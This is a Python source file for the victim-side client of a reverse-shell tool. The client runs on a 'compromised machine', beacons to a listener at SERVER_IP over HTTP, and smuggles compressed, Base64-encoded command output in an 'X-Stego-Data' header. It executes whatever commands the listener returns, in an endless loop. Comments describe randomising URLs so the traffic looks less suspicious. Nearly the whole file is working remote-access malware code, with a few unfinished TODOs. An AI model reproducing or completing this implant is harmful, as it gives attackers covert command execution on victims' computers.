'''
Executes on the compromised machine. Spawns a reverse shell and communicates with the listener over HTTP.

1. Client intitiates connection with listener (by sending cwd)
SENDING MESSAGE
1. Client sends output to listener (http request)
2. Listener sends input to client (http response)
3. Cycle repeats
'''

import requests
import base64
import os
import subprocess
import zlib
from utils import SERVER_IP, SERVER_PORT

# Time in seconds to wait for a http response before a timeout occurs.
# This time should be long, to give user ample time to input their commands into the listener. 
REQUEST_TIMEOUT = 60
# The URL of the listener
SERVER_ROOT_URL = f'http://{SERVER_IP}:{SERVER_PORT}'

def get_random_url():
    '''
    Generate a randomised url to visit a page on the listener's webserver.
    (because it'd look suspicious if the client kept requesting the exact same page)
    '''
    # TODO: insert code here
    # For now, just return the root url.
    return SERVER_ROOT_URL

def send_and_receive_server(message: str):
    '''
    Encodes message and sends as HTTP request, then returns http response.
    '''
    print(str(len(message.encode('utf-8'))) + " --> " + str(len(zlib.compress(message.encode('utf-8')))))
    # Compress text
    compressed_bytes = zlib.compress(message.encode('utf-8'))
    # TODO: if compressed form is LARGER, send uncompressed form, and indicate so
    # TODO: if empty string, don't compress/encode. just send empty string
    # Encode data into Base64 (obfuscates it, and also ensures all characters are valid to put inside http header)
    encoded_message = base64.b64encode(compressed_bytes).decode('utf-8')

    # # Send the data as part of the HTTP header
    headers = {
        'X-Stego-Data': encoded_message
    }
    url = get_random_url()
    response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
    return response.text

def process_input(input: str):
    '''
    Processes commandline input, returns output.
    '''
    # TODO: change this copied logic
    split_input = input.split()
    if input.lower() == "exit":
        # if the command is exit, just break out of the loop
        # TODO
        return
    # IS THIS NEEDED? 'cd' might be a terminal built-in...
    # if split_input[0].lower() == "cd":
    #     # cd command, change directory
    #     try:
    #         os.chdir(' '.join(split_input[1:]))
    #     except FileNotFoundError as e:
    #         # if there is an error, set as the output
    #         output = str(e)
    #     else:
    #         # if operation is successful, empty message
    #         output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(input)
        # result = subprocess.run(input, shell=True, text=True, capture_output=True)
        # # Check if input successfully ran as a command..
        # if result.returncode == 0:
        #     output = result.stdout
        # else:
        #     output = result.stderr
    # get the current working directory as output
    output = f"{output}"
    return output

def main():
    output = os.getcwd()
    while (True):
        input = send_and_receive_server(output)
        output = process_input(input)

if __name__ == '__main__':
    main()